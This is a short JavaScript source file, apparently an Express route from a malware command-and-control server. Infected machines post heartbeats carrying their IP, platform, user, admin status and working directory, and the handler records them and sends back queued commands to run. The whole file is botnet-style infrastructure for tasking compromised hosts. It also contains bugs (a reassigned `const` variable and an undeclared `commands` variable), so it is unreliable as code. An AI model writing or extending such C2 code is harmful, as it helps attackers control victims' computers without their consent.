const express = require("express");
const router = express.Router();
const Target = require("../../models/Target");
const Command = require("../../models/Command");

router.post("/", async (req, res) => {
  // TODO: request should maybe be containing the heartbeat as an object?
  const { id, uptime, ip, platform, runningAs, isAdmin, workingDir } = req.body; // ID is calculated from the MAC address by the malware
  const target = await Target.findOne({ targetID: id });

  if (!target) {
    target = new Target({
      targetID: id,
      ip,
      uptime,
      platform,
      runningAs,
      isAdmin,
      workingDir
    });
    await target.save();
  } else {
    target.ip = ip;
    target.uptime = uptime;
    target.platform = platform;
    target.runningAs = runningAs;
    target.isAdmin = isAdmin;
    target.workingDir = workingDir;

    await target.save();
  }

  // Find all Commands for the given target
  commands = await Command.find({ targetID: target.targetID });
  res.json({ commands: commands });

  commands.forEach(async command => {
    command.hasBeenRun = true;
    await command.save();
  });
});

module.exports = router;
